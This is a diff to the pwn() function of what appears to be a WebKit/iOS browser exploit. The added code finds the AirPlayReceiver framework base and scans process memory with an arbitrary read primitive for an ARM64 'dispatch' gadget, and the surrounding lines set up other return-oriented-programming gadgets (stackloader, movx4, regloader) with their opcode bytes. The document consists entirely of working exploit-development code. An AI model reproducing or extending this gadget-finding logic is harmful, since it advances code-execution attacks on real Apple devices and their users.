@@ -483,6 +483,9 @@ function pwn() {
     var security_base = find_dylib_by_name(libcpp1_base, "/System/Library/Frameworks/Security.framework/Security")
     log(`[+] security_base: ${security_base}`);
 
+    var airplayreceiver_base = find_dylib_by_name(libcpp1_base, "/System/Library/PrivateFrameworks/AirPlayReceiver.framework/AirPlayReceiver")
+    log(`[+] airplayreceiver_base: ${airplayreceiver_base}`);
+
 
     var libsystem_platform_base = find_dylib_by_name(libcpp1_base, "libsystem_platform")
     log(`[+] libsystem_platform_base: ${libsystem_platform_base}`);
@@ -591,6 +594,38 @@ function pwn() {
     log(`[+] ldrx8: ${ldrx8}`);
 
 
+
+
+
+    // 3. DISPATCH
+    var APAdvertiserGetTypeID_addr = find_symbol_address(airplayreceiver_base, "__APAdvertiserGetTypeID");
+    log(`[+] APAdvertiserGetTypeID_addr: ${APAdvertiserGetTypeID_addr}`);
+    try_count = 0;
+    var dispatch = Add(airplayreceiver_base, APAdvertiserGetTypeID_addr);
+    dispatch = Sub(dispatch, 0x2000);
+    while (true) {
+        if(try_count > 10000) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        // AirPlayReceiver:__text:00000001A9AC7958 A0 02 3F D6                             BLR             X21
+        // AirPlayReceiver:__text:00000001A9AC795C FD 7B 43 A9                             LDP             X29, X30, [SP,#0x30]
+        // AirPlayReceiver:__text:00000001A9AC7960 F4 4F 42 A9                             LDP             X20, X19, [SP,#0x20]
+        // AirPlayReceiver:__text:00000001A9AC7964 F6 57 41 A9                             LDP             X22, X21, [SP,#0x10]
+        // AirPlayReceiver:__text:00000001A9AC7968 FF 03 01 91                             ADD             SP, SP, #0x40 ; '@'
+        // AirPlayReceiver:__text:00000001A9AC796C C0 03 5F D6                             RET
+        opcode = read32(dispatch);
+        if(opcode == 0xD63F02A0) {
+            if(read32(Add(dispatch, 4)) == 0xA9437BFD && read32(Add(dispatch, 8)) == 0xA9424FF4 && read32(Add(dispatch, 12)) == 0xA94157F6 && read32(Add(dispatch, 16)) == 0x910103FF && read32(Add(dispatch, 20)) == 0xD65F03C0)
+                break;
+        }
+        dispatch = Sub(dispatch, 4);
+        try_count++;
+    }
+    log(`[+] dispatch: ${dispatch}`);
+
+
     return;
 
 
@@ -639,7 +674,7 @@ function pwn() {
 
     //gadgets
     // var stackloader = Add(webcore_base, offsets.stackloader); //v FD 7B 46 A9 F4 4F 45 A9 F6 57 44 A9 F8 5F 43 A9 FA 67 42 A9 FC 6F 41 A9 FF C3 01 91 C0 03 5F D6 
-    var ldrx8 = Add(webcore_base, offsets.ldrx8);    //v E8 03 40 F9 68 02 00 F9 FD 7B 42 A9 F4 4F 41 A9 FF C3 00 91 C0 03 5F D6 
+    // var ldrx8 = Add(webcore_base, offsets.ldrx8);    //v E8 03 40 F9 68 02 00 F9 FD 7B 42 A9 F4 4F 41 A9 FF C3 00 91 C0 03 5F D6 
     var dispatch = Add(coreaudio_base, offsets.dispatch)   //v A0 02 3F D6 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 FF 03 01 91 C0 03 5F D6
     var movx4 = Add(webcore_base, offsets.movx4);    //v E4 03 14 AA 00 01 3F D6 
     var regloader = Add(libcpp1_base, offsets.regloader); //v E3 03 16 AA E6 03 1B AA E0 03 18 AA E1 03 13 AA E2 03 17 AA E4 03 40 F9 00 01 3F D6
